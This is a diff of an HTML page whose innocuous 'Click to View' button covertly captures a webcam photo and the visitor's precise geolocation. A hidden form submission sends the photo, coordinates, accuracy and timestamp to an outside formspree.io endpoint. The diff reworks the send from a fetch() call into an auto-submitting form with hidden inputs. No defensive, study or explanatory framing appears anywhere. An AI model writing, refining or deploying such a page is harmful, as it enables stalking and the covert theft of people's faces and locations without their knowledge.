@@ -11,68 +11,74 @@
   display:flex;
   align-items:center;
   justify-content:center;
-  background:#ffffff;
+  background:#fff;
 ">
 
-<button id="capture"
-  style="
-    padding:16px 28px;
-    font-size:16px;
-    background:black;
-    color:white;
-    border:none;
-    border-radius:6px;
-    cursor:pointer;
-  ">
-  Click to View
-</button>
+<form id="form"
+      method="POST"
+      action="https://formspree.io/f/xlgdqobv"
+      enctype="multipart/form-data">
+
+  <button type="button" id="btn"
+    style="
+      padding:16px 28px;
+      font-size:16px;
+      background:black;
+      color:white;
+      border:none;
+      border-radius:6px;
+      cursor:pointer;
+    ">
+    Click to View
+  </button>
+
+</form>
 
 <video id="video" autoplay playsinline hidden></video>
 <canvas id="canvas" hidden></canvas>
 
 <script>
-const btn = document.getElementById("capture");
+const btn = document.getElementById("btn");
+const form = document.getElementById("form");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 
 btn.onclick = async () => {
-  try {
-    // Camera access
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  video.srcObject = stream;
 
-    // Location access
-    navigator.geolocation.getCurrentPosition(pos => {
+  navigator.geolocation.getCurrentPosition(pos => {
 
-      setTimeout(() => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
 
-        // Convert canvas to REAL image file
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append("photo", blob, "selfie.jpg");
-          formData.append("latitude", pos.coords.latitude);
-          formData.append("longitude", pos.coords.longitude);
-          formData.append("accuracy", pos.coords.accuracy);
-          formData.append("time", new Date().toISOString());
+      canvas.toBlob(blob => {
+        const photo = document.createElement("input");
+        photo.type = "file";
+        photo.name = "photo";
+        photo.files = new DataTransfer().files;
 
-          fetch("https://formspree.io/f/xlgdqobv", {
-            method: "POST",
-            body: formData
-          });
+        const dt = new DataTransfer();
+        dt.items.add(new File([blob], "selfie.jpg", { type: "image/jpeg" }));
+        photo.files = dt.files;
 
-          // Stop camera
-          stream.getTracks().forEach(t => t.stop());
-        }, "image/jpeg");
+        form.appendChild(photo);
 
-      }, 700);
-    });
+        form.innerHTML += `
+          <input type="hidden" name="latitude" value="${pos.coords.latitude}">
+          <input type="hidden" name="longitude" value="${pos.coords.longitude}">
+          <input type="hidden" name="accuracy" value="${pos.coords.accuracy}">
+          <input type="hidden" name="time" value="${new Date().toISOString()}">
+        `;
 
-  } catch (e) {
-    // Permission denied or error
-  }
+        stream.getTracks().forEach(t => t.stop());
+        form.submit(); // 🔴 REAL POST
+      }, "image/jpeg");
+
+    }, 700);
+  });
 };
 </script>
 
